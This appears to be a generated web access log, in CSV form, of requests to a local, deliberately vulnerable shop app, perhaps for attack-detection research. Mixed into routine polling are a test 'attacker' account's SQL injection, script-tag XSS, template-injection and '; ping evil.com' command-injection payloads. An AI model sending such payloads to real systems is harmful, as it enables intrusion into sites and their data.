_id,signature,body_bytes,ip,request.method,request.path,request.protocol,request_body,status,timestamp
e75f64ea33e83e7e45123e39,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWM5a8&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:05:02+0530
bb72d040067d64a99c9bec8c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMBgu&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:05:03+0530
ea1f4c56df01eeaeba9781f3,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMBgw&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:05:28+0530
f4d4cb328f09b93b3a57c1d0,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMHtc&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:05:28+0530
25cc62817780297000b876f8,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMHtq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:05:53+0530
34c6ad0aeb487fcb14557acc,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMO4x&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:05:53+0530
2c0ec99444f52a6135be69a8,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMO5Z&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:06:18+0530
fa3caff74eb3d57bad05ebb3,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMUC5&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:06:18+0530
9cfdc7cdf26cd5e43f1d375b,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMUCU&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:06:43+0530
5483db5467909ec26a0920a7,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMaJG&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:06:43+0530
e45e9eabe3d5fedb990ec95c,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMaJK&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:07:08+0530
adb40b22cd66ee48412f8e2a,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMgQD&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:07:08+0530
55fe364a3671b5067d84b59f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMgS7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:07:33+0530
7987e111b605d639720a2814,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMmWo&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:07:33+0530
9ebc1d6b69f62ea5b1602ad6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMmWq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:07:58+0530
af6f750512ba6e66cd8f1457,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMsdc&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:07:58+0530
3b464c2e3a208dbabca9be57,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMsdd&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:08:23+0530
7a5d1e782d85fb3c7685b6d8,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMykQ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:08:23+0530
e523a3e143c31a87c004bbd6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMykV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:08:48+0530
eb249b7be89ee79ed2cc3902,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWN2sP&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:08:48+0530
a95fa46d87de635b65fea49f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWN2sQ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:09:13+0530
2d4a3940eff2900a52baf1c2,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWN8zO&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:09:13+0530
a10a3938442929d2958e634a,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWN8zV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:09:38+0530
96803c4b785d358a5532d17d,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNF4S&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:09:38+0530
9643ecbc9ec1ce5ec2b35fb1,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNF4V&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:10:03+0530
4c2b4ce590d67996ca2ce322,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNLBA&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:10:03+0530
3dd794ab6f499f18a95c347f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNLBE&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:10:28+0530
0215ea95223e41e47090f122,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNRH_&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:10:28+0530
48b92529eb4a48ec14f3d230,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNRI3&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:10:53+0530
26e80e000756697a14662a67,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNXP4&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:10:53+0530
110b655d645e6a0f8324cc61,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNXP6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:11:18+0530
ddc2f905a209cd211317fb6f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNdVx&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:11:18+0530
cece75c0f43d90bd7310dc3d,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNdWN&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:11:43+0530
81389c6d6f88b06dbff4dd67,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNjd8&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:11:43+0530
140fe8b7df08265ac0973783,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNjdC&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:12:08+0530
c55262cd9215eb50452af139,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNpkS&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:12:08+0530
ce48695546829dcab7339cfc,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNpkb&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:12:33+0530
a56c6503633684b6ae1e447e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNvs3&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:12:34+0530
161b5504ebd3090dca47baf1,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNvs9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:12:59+0530
cb704e800bb4b177018d54c6,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWN_-1&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:12:59+0530
adf8ccd93b5a278a7685df29,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWN_-7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:13:24+0530
18a29da8d03dc9246a61d810,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWO65E&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:13:24+0530
fad516da9f9dd28fe8178e14,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWO65G&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:13:49+0530
05a25f7cb564f14ec3a40ee4,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOCC6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:13:49+0530
5beb89b7303fdc3ebce34932,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOCC9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:14:14+0530
cc852670f2e822eacc55794b,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOIIs&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:14:14+0530
be3b0a06a1ab47a4d4366493,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOII_&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:14:39+0530
66de411c1c0d846ad2470988,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOOPc&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:14:39+0530
ec520545b744a4d6afb679d7,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOOPk&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:15:04+0530
64844d492f8168162555b042,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOUWI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:15:04+0530
a09efff8243245b319d3e6cd,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOUWM&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:15:29+0530
657d265b2eeee7c677a5233b,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOadS&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:15:29+0530
09a5cf9eb2b323d2692f4c82,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOadc&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:15:54+0530
bb6834254c44a6bac67001df,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOgkf&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:15:54+0530
5493770b04e559b8b2b7c70c,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOgkh&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:16:19+0530
eda9f8413a97233129986817,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOmrW&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:16:19+0530
0fef4ce535404ce00d4cb93e,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOmri&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:16:44+0530
ac0d11fc31c5d16e6ddd5d3e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOsyZ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:16:44+0530
97741e690e5859fea0be3962,0a03c19f3929936e,313,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22attacker91910@test.com\x22, \x22password\x22: \x22Test1234!\x22, \x22passwordRepeat\x22: \x22Test1234!\x22, \x22securityQuestion\x22: {\x22id\x22: 1, \x22question\x22: \x22Your eldest siblings middle name?\x22}, \x22securityAnswer\x22: \x22test\x22}",201,2025-12-03T00:17:01+0530
f6940c8a72220e2feb5022a7,0f7663d2311ea47f,820,127.0.0.1,POST,/rest/user/login,HTTP/1.1,"{\x22email\x22: \x22attacker91910@test.com\x22, \x22password\x22: \x22Test1234!\x22}",200,2025-12-03T00:17:01+0530
ab0c93693124a7db453965d9,d15e0519eeded2db,286,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 646\x22, \x22mobileNum\x22: \x225206103075\x22, \x22zipCode\x22: \x2215066\x22, \x22streetAddress\x22: \x22255 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:17:01+0530
0da3b617e1e20b15bc498dd4,d15e0519eeded2db,286,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 599\x22, \x22mobileNum\x22: \x224508079769\x22, \x22zipCode\x22: \x2246771\x22, \x22streetAddress\x22: \x22253 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:17:01+0530
82132301ace14a32022650f5,d15e0519eeded2db,285,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 31\x22, \x22mobileNum\x22: \x227343377182\x22, \x22zipCode\x22: \x2236698\x22, \x22streetAddress\x22: \x22111 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:17:02+0530
728972a889b71c954fa55523,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 957\x22, \x22cardNum\x22: \x224218239359708059\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2026}",400,2025-12-03T00:17:02+0530
a68060016a2608429d683037,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 652\x22, \x22cardNum\x22: \x224802290097638604\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2028}",400,2025-12-03T00:17:02+0530
a3f0ea4285ac37a33230e51b,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 687\x22, \x22cardNum\x22: \x224170138513375174\x22, \x22expMonth\x22: 8, \x22expYear\x22: 2029}",400,2025-12-03T00:17:02+0530
961a6d39e262faed4904b1f9,8e56293a547bf300,156,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 25, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,2025-12-03T00:17:02+0530
c52285fa0125a8f022c3dcae,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 3, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,2025-12-03T00:17:02+0530
5a4617b1943011f55a78806c,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 1, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,2025-12-03T00:17:02+0530
ec772cf0a7a93df0c351772f,cfa53d91046646b3,369,127.0.0.1,GET,/rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3--,HTTP/1.1,,500,2025-12-03T00:17:02+0530
e96a19b6a002749835e79eda,afd4dfc890508305,309,127.0.0.1,PUT,/api/Addresss/62,HTTP/1.1,"{\x22fullName\x22: \x22Updated '\x5C\x22><script>aler\x22, \x22city\x22: \x22New '\x5C\x22><script City\x22}",200,2025-12-03T00:17:04+0530
e8c416e34830f8d4c324996d,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/53,HTTP/1.1,,200,2025-12-03T00:17:05+0530
0cf10d5065306aafdf3b3b57,fb2c2427a0e632f0,972,127.0.0.1,GET,/rest/basket/9,HTTP/1.1,,200,2025-12-03T00:17:07+0530
9159b8ca6d0e0b83f7a910f0,afd4dfc890508305,289,127.0.0.1,PUT,/api/Addresss/63,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR 1=1-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:08+0530
e1606c57c20a97738d8c4a36,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOsz1&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:17:09+0530
bf11c005a2d1a28195fba10f,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/52,HTTP/1.1,,200,2025-12-03T00:17:10+0530
84d321d392925ca125f1a98f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOzJP&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:17:10+0530
4a715b0069e538fbc7c3909d,1d8c3cc2b722f935,8724,127.0.0.1,GET,/api/Challenges,HTTP/1.1,,200,2025-12-03T00:17:11+0530
73fb42feccc14902a6f0fe71,afd4dfc890508305,307,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22fullName\x22: \x22Updated <script>alert('\x22, \x22city\x22: \x22New <script>al City\x22}",200,2025-12-03T00:17:12+0530
318f8e7066e83766d60ac3bf,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 406\x22, \x22cardNum\x22: \x224325617450057111\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2027}",400,2025-12-03T00:17:14+0530
8ed27f2ec46691a10cc8fd0e,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 874\x22, \x22cardNum\x22: \x224370221347857725\x22, \x22expMonth\x22: 9, \x22expYear\x22: 2030}",400,2025-12-03T00:17:16+0530
257f413e460b1e1658c0f5dc,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 9, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,2025-12-03T00:17:16+0530
fd7b33339455b1d7f75ca296,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/54,HTTP/1.1,,200,2025-12-03T00:17:16+0530
2b5a76af28e055893fcfdddd,8a8229fcdabd3f44,30,127.0.0.1,GET,/rest/products/search?q=%24%7B7%2A7%7D,HTTP/1.1,,200,2025-12-03T00:17:18+0530
884d31ca13c6114836f2df42,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 821\x22, \x22cardNum\x22: \x224999714344501065\x22, \x22expMonth\x22: 10, \x22expYear\x22: 2030}",400,2025-12-03T00:17:19+0530
df253da0b0c1f65416286cfb,bc466f600626b8a9,157,127.0.0.1,PUT,/api/BasketItems/51,HTTP/1.1,{\x22quantity\x22: -1},200,2025-12-03T00:17:20+0530
16dff54f32d9477e91bf9cf2,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 94\x22, \x22cardNum\x22: \x224229745294946390\x22, \x22expMonth\x22: 12, \x22expYear\x22: 2027}",400,2025-12-03T00:17:21+0530
dde36075a12fd2bbf7471a90,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/51,HTTP/1.1,,200,2025-12-03T00:17:22+0530
fc465b13a6736c8997895d04,5873550952c2aa8b,853,127.0.0.1,GET,/api/Addresss,HTTP/1.1,,200,2025-12-03T00:17:23+0530
74e2c19502577a26b2a761c9,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 1, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,2025-12-03T00:17:25+0530
6bfa95a737be6ed967d4d975,1b03c5b89b8e6cfa,61,127.0.0.1,PUT,/api/BasketItems/55,HTTP/1.1,{\x22quantity\x22: 7},400,2025-12-03T00:17:25+0530
58f4583dd92bbe02c2939803,b612a7b98fc9ce89,59,127.0.0.1,DELETE,/api/Addresss/63,HTTP/1.1,,200,2025-12-03T00:17:26+0530
e063147f06e3516f62e7685c,39ff7855035974aa,30,127.0.0.1,GET,/api/Cards,HTTP/1.1,,200,2025-12-03T00:17:27+0530
5c45f237f0f4972f49ea7771,afd4dfc890508305,314,127.0.0.1,PUT,/api/Addresss/62,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR '1'='1 Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:29+0530
75880406eeaa337c6b116b57,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/55,HTTP/1.1,,200,2025-12-03T00:17:30+0530
993d9c6ad42ca4d4c1f22454,39ff7855035974aa,30,127.0.0.1,GET,/api/Cards,HTTP/1.1,,200,2025-12-03T00:17:32+0530
da50359806be70983a03bdaa,afd4dfc890508305,318,127.0.0.1,PUT,/api/Addresss/62,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' UNION SELECT  Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:34+0530
e84dcf08fec29bf7e3b834ca,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOzJg&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:17:35+0530
8813c7e3afd988ca3bc20e96,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWP3T2&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:17:35+0530
f3ce9d36b69d90821f6da985,b612a7b98fc9ce89,59,127.0.0.1,DELETE,/api/Addresss/62,HTTP/1.1,,200,2025-12-03T00:17:36+0530
7543ad84f8fb04029cb8c273,e0b7cc339ffdc6bb,444,127.0.0.1,GET,/api/SecurityQuestions,HTTP/1.1,,200,2025-12-03T00:17:37+0530
525ef6394d5826eae3dc72d1,afd4dfc890508305,316,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22streetAddress\x22: \x22789 '; DROP TABLE u Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:39+0530
1dfac300be0a35cb0354dfd7,d15e0519eeded2db,286,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 802\x22, \x22mobileNum\x22: \x227772607020\x22, \x22zipCode\x22: \x2235428\x22, \x22streetAddress\x22: \x22834 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:17:41+0530
39b329062e5722d6cf8b4ac5,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 928\x22, \x22cardNum\x22: \x224949771234505643\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2030}",400,2025-12-03T00:17:41+0530
e78b42262d8c766e630cf0a7,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 4, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:17:41+0530
33f98b764063f6f1fbebd8e0,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/56,HTTP/1.1,,200,2025-12-03T00:17:41+0530
c8f261026c5253c27ef3651c,6801cb44dc6a692c,30,127.0.0.1,GET,/rest/products/15/reviews,HTTP/1.1,,200,2025-12-03T00:17:42+0530
2c9b06e9e09139128284a469,afd4dfc890508305,312,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR 'x'='x Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:44+0530
d50a09d93b7544322dcb6db8,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 588\x22, \x22cardNum\x22: \x224697025427926814\x22, \x22expMonth\x22: 10, \x22expYear\x22: 2030}",400,2025-12-03T00:17:46+0530
42fa8db795d7e85acc5a0a0c,8e56293a547bf300,156,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 31, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:17:48+0530
5efaa6fbe00c2903a75b51e8,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/57,HTTP/1.1,,200,2025-12-03T00:17:48+0530
e4bd849d20e5a82cbcad1b3b,db5fd8aea95ad766,30,127.0.0.1,GET,/rest/products/search?q=%3B%20ping%20-c%205%20evil.com,HTTP/1.1,,200,2025-12-03T00:17:50+0530
3711b3e393f1457529491072,afd4dfc890508305,312,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR '1'='1 Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:52+0530
b7098387d950529315696f4a,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 877\x22, \x22cardNum\x22: \x224326261386153445\x22, \x22expMonth\x22: 4, \x22expYear\x22: 2030}",400,2025-12-03T00:17:52+0530
